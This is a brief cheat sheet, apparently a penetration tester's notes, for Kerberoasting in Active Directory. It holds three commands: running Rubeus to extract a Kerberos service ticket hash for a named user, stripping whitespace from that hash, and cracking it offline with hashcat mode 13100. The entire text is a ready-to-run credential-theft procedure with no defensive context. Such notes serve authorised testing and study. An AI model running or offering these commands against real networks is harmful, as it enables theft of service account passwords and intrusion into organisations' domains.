Rubeus

Kerberoasting with hashcat

# Kerberoast a specified user:
C:\Users\Public\rubeus.exe kerberoast /user:<username>

# Copy the hash output to a file, then
# trim the spaces and newlines:
cat <raw hash file> | tr -d '\n' | tr -d ' ' > <trimmed hash file>

# Crack the hash with hashcat:
hashcat -m 13100 -a 0 <trimmed hash file> <wordlist> --force
